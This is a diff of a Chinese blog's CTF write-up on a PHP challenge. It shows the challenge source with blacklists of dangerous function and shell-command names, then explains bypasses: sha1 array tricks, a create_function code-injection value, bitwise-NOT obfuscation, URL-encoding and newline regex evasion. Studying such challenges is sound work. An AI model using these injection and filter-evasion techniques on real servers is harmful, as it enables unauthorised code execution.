@@ -1,7 +1,7 @@
 <!doctype html>
 <html class="position-relative" itemscope itemtype="https://schema.org/WebPage" lang="en"
   data-bs-theme="auto" data-palette="blue">
-  <head><script src="/assets/init/bundle.min.658d13e58d95d8bb2da082cf6e92f29c1f07475fd145926c2c401f88f9ddf545.js" integrity="sha256-ZY0T5Y2V2LstoILPbpLynB8HR1/RRZJsLEAfiPnd9UU=" crossorigin="anonymous"></script>
+  <head><script src="/assets/init/bundle.min.0815b7e73ceecd1be5ee8303df916b89a7fd1454fb835a47e3b2f9739781426f.js" integrity="sha256-CBW35zzuzRvl7oMD35Friaf9FFT7g1pH47L5c5eBQm8=" crossorigin="anonymous"></script>
 <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>260325~~每~~日打卡 - decimo的小窝</title>
@@ -32,7 +32,7 @@
   <meta itemprop="description" content="2026/03/25做题记录">
   <meta itemprop="datePublished" content="2026-03-25T20:43:35+08:00">
   <meta itemprop="dateModified" content="2026-03-25T20:43:35+08:00">
-  <meta itemprop="wordCount" content="483">
+  <meta itemprop="wordCount" content="514">
   <meta itemprop="keywords" content="CTF,Web">
   <meta property="og:image" content="https://decimo.top/images/logo.png"/>
   <meta name="twitter:image" content="https://decimo.top/images/logo.png"/>
@@ -44,7 +44,7 @@
     <link data-precache rel="stylesheet" href="/assets/viewer/bundle.min.16d2c85c4cae39a98f8cb7a977e95e554b174f91a5484c32605637156f49ca6b.css" integrity="sha256-FtLIXEyuOamPjLepd&#43;leVUsXT5GlSEwyYFY3FW9Jyms=" crossorigin="anonymous">
 
 
-<link rel="stylesheet" href="/css/custom.8cc5830dfc3827d70305a39f1925ac813f85effc381d9b656ac82115d234cbea.css" integrity="sha256-jMWDDfw4J9cDBaOfGSWsgT&#43;F7/w4HZtlasghFdI0y&#43;o=" crossorigin="anonymous">
+<link rel="stylesheet" href="/css/custom.730a801596309655d4fc41e9ef9ac6d3a06d0396ba0b1cea47e7418cf1013673.css" integrity="sha256-cwqAFZYwllXU/EHp75rG06BtA5a6CxzqR&#43;dBjPEBNnM=" crossorigin="anonymous">
 <script>
 (function() {
   var originalTitle = document.title;
@@ -285,59 +285,59 @@ decimo的小窝
 
 </p>
 <p>访问对应路径拿到源码</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>); 
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1nD3x.php&#34;</span>;
-</span></span><span style="display:flex;"><span>$shana <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;shana&#39;</span>];
-</span></span><span style="display:flex;"><span>$passwd <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;passwd&#39;</span>];
-</span></span><span style="display:flex;"><span>$arg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
-</span></span><span style="display:flex;"><span>$code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($_SERVER) { 
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&#34;|\&#39;|log/i&#39;</span>, $_SERVER[<span style="color:#e6db74">&#39;QUERY_STRING&#39;</span>])
-</span></span><span style="display:flex;"><span>        )  
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;You seem to want to do something bad?&#39;</span>); 
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/http|https/i&#39;</span>, $_GET[<span style="color:#e6db74">&#39;file&#39;</span>])) {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^aqua_is_cute$/&#39;</span>, $_GET[<span style="color:#e6db74">&#39;debu&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> $_GET[<span style="color:#e6db74">&#39;debu&#39;</span>] <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;aqua_is_cute&#39;</span>) { 
-</span></span><span style="display:flex;"><span>        $file <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;file&#34;</span>]; 
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Neeeeee! Good Job!&lt;br&gt;&#34;</span>;
-</span></span><span style="display:flex;"><span>    } 
-</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;fxck you! What do you want to do ?!&#39;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($_REQUEST) { 
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span>($_REQUEST <span style="color:#66d9ef">as</span> $value) { 
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/[a-zA-Z]/i&#39;</span>, $value))  
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;fxck you! I hate English!&#39;</span>); 
-</span></span><span style="display:flex;"><span>    } 
-</span></span><span style="display:flex;"><span>} 
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_get_contents</span>($file) <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;debu_debu_aqua&#39;</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">sha1</span>($shana) <span style="color:#f92672">===</span> <span style="color:#a6e22e">sha1</span>($passwd) <span style="color:#f92672">&amp;&amp;</span> $shana <span style="color:#f92672">!=</span> $passwd ){
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">extract</span>($_GET[<span style="color:#e6db74">&#34;flag&#34;</span>]);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Very good! you know my password. But what is flag?&lt;br&gt;&#34;</span>;
-</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&#34;</span>);
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^[a-z0-9]*$/isD&#39;</span>, $code) <span style="color:#f92672">||</span> 
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\&#34;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;</span>, $arg) ) { 
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&#34;</span>); 
-</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> { 
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;flag.php&#34;</span>;
-</span></span><span style="display:flex;"><span>    $code(<span style="color:#e6db74">&#39;&#39;</span>, $arg); 
-</span></span><span style="display:flex;"><span>} <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">This is a very simple challenge and if you solve it I will give you a flag. Good Luck!
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">fxck you! I hate English!
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="s2">&#34;1nD3x.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nv">$shana</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;shana&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nv">$passwd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="nv">$arg</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nv">$code</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">
+</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">if</span> <span class="p">(</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&#34;|\&#39;|log/i&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="p">)</span>  
+</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;You seem to want to do something bad?&#39;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">
+</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/http|https/i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^aqua_is_cute$/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debu&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debu&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">&#39;aqua_is_cute&#39;</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">];</span> 
+</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Neeeeee! Good Job!&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;fxck you! What do you want to do ?!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">
+</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_REQUEST</span> <span class="k">as</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z]/i&#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">))</span>  
+</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;fxck you! I hate English!&#39;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="ln">33</span><span class="cl">
+</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">!==</span> <span class="s1">&#39;debu_debu_aqua&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">36</span><span class="cl">
+</span></span><span class="line"><span class="ln">37</span><span class="cl">
+</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$shana</span><span class="p">)</span> <span class="o">===</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$passwd</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$shana</span> <span class="o">!=</span> <span class="nv">$passwd</span> <span class="p">){</span>
+</span></span><span class="line"><span class="ln">39</span><span class="cl">    <span class="nx">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;flag&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="ln">40</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Very good! you know my password. But what is flag?&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="p">}</span> <span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="ln">42</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">44</span><span class="cl">
+</span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[a-z0-9]*$/isD&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)</span> <span class="o">||</span> 
+</span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\&#34;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;</span><span class="p">,</span> <span class="nv">$arg</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="ln">47</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="ln">49</span><span class="cl">    <span class="k">include</span> <span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">50</span><span class="cl">    <span class="nv">$code</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$arg</span><span class="p">);</span> 
+</span></span><span class="line"><span class="ln">51</span><span class="cl"><span class="p">}</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="err">This is a very simple challenge and if you solve it I will give you a flag. Good Luck!
+</span></span></span><span class="line"><span class="ln">53</span><span class="cl"><span class="err">fxck you! I hate English!
 </span></span></span></code></pre></div><p>哇，这么多正则匹配看的好难受。这哪是ezphp，又骗我</p>
 <p>这道题非常复杂，先来说下<strong>考点</strong></p>
 
@@ -381,26 +381,26 @@ decimo的小窝
 </ul>
 
 <h3 id="sha1数组绕过" data-numberify>SHA1数组绕过：<a class="anchor ms-1" href="#sha1数组绕过"></a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">sha1</span>([])      <span style="color:#75715e">// 返回 NULL
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">sha1</span>([<span style="color:#ae81ff">1</span>])     <span style="color:#75715e">// 返回 NULL
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">sha1</span>([<span style="color:#ae81ff">2</span>])     <span style="color:#75715e">// 返回 NULL
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">NULL</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">NULL</span> <span style="color:#75715e">// true
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sha1</span><span class="p">([])</span>      <span class="c1">// 返回 NULL
+</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span><span class="nx">sha1</span><span class="p">([</span><span class="mi">1</span><span class="p">])</span>     <span class="c1">// 返回 NULL
+</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1"></span><span class="nx">sha1</span><span class="p">([</span><span class="mi">2</span><span class="p">])</span>     <span class="c1">// 返回 NULL
+</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span><span class="k">NULL</span> <span class="o">===</span> <span class="k">NULL</span> <span class="c1">// true
 </span></span></span></code></pre></div><p>传入数组时，<code>sha1()</code>返回<code>NULL</code>，两个<code>NULL</code>相等。同时两个不同的数组（<code>[1]</code>和<code>[2]</code>）不相等，满足<code>$a != $b</code></p>
 
 <h3 id="create_" data-numberify>create_<a class="anchor ms-1" href="#create_"></a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">create_function</span>(<span style="color:#e6db74">&#39;$arg&#39;</span>, <span style="color:#e6db74">&#39;echo $arg;&#39;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// 等价于创建匿名函数：
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// function anonymous($arg) { echo $arg; }
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;$arg&#39;</span><span class="p">,</span> <span class="s1">&#39;echo $arg;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1">// 等价于创建匿名函数：
+</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1">// function anonymous($arg) { echo $arg; }
 </span></span></span></code></pre></div><p>如果第二个参数是<code>;}phpinfo();//</code>：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">create_function</span>(<span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;;}phpinfo();//&#39;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// 实际生成的代码：
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// function anonymous() { ;}phpinfo();// }
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;;}phpinfo();//&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1">// 实际生成的代码：
+</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1">// function anonymous() { ;}phpinfo();// }
 </span></span></span></code></pre></div><p>先闭合前面的<code>{</code>，然后执行<code>phpinfo()</code>，后面的<code>//</code>注释掉多余的<code>}</code>。</p>
 
 <h3 id="取反" data-numberify>取反（~<a class="anchor ms-1" href="#取反"></a></h3>
 <p>PHP中<code>~</code>是按位取反运算符。对字符串取反会得到不可见字符：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#f92672">~</span><span style="color:#e6db74">&#34;phpinfo&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// 输出不可见字符（二进制数据）
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">echo</span> <span class="o">~</span><span class="s2">&#34;phpinfo&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1">// 输出不可见字符（二进制数据）
 </span></span></span></code></pre></div><p>这些不可见字符<strong>不包含字母</strong>，可以绕过<code>/[a-zA-Z]/</code>的正则检查。直接写取反，在执行时会得到phpinfo原指令</p>
 
 <h3 id="php伪协议" data-numberify>PHP伪协议<a class="anchor ms-1" href="#php伪协议"></a></h3>
@@ -427,20 +427,20 @@ decimo的小窝
 <h2 id="绕过" data-numberify>绕过<a class="anchor ms-1" href="#绕过"></a></h2>
 
 <h3 id="第一层_serverquery_string-黑名单" data-numberify>第一层：$_SERVER['QUERY_STRING'] 黑名单<a class="anchor ms-1" href="#第一层_serverquery_string-黑名单"></a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/shana|debu|aqua|cute|arg|code|flag|system|.../&#39;</span>, $_SERVER[<span style="color:#e6db74">&#39;QUERY_STRING&#39;</span>])
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/shana|debu|aqua|cute|arg|code|flag|system|.../&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">])</span>
 </span></span></code></pre></div><p>黑名单匹配的是原始查询字符串，只要我们对字符串进行URL编码就能绕过，URL编码之后只有%和数字</p>
 
 <h3 id="第二层debu参数正则陷阱" data-numberify>第二层：debu参数正则陷阱<a class="anchor ms-1" href="#第二层debu参数正则陷阱"></a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^aqua_is_cute$/&#39;</span>, $_GET[<span style="color:#e6db74">&#39;debu&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> $_GET[<span style="color:#e6db74">&#39;debu&#39;</span>] <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;aqua_is_cute&#39;</span>)
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^aqua_is_cute$/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debu&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debu&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">&#39;aqua_is_cute&#39;</span><span class="p">)</span>
 </span></span></code></pre></div><p>这里就有两个要求</p>
 <p>一是 <code>debu</code>必须匹配正则<code>/^aqua_is_cute$/</code>（这个正则匹配的意思是必须精准匹配字符串&quot;aqua_is_cute&quot;</p>
 <p>二是 <code>debu</code>不能严格等于<code>&quot;aqua_is_cute&quot;</code></p>
 <p>我们可以通过在后面加一个换行符来绕过<code>%0a</code>（\n)</p>
 
 <h3 id="第三层_request无字母过滤" data-numberify>第三层：$_REQUEST无字母过滤<a class="anchor ms-1" href="#第三层_request无字母过滤"></a></h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span>($_REQUEST <span style="color:#66d9ef">as</span> $value) { 
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/[a-zA-Z]/i&#39;</span>, $value)) <span style="color:#66d9ef">die</span>();
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_REQUEST</span> <span class="k">as</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z]/i&#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">))</span> <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>不能有任何字母说是，He hate English还要用英语说话</p>
 <p>我们可以利用<code>$_REQUEST</code>的<strong>POST覆盖GET</strong>特性</p>
 <table>
@@ -467,17 +467,17 @@ decimo的小窝
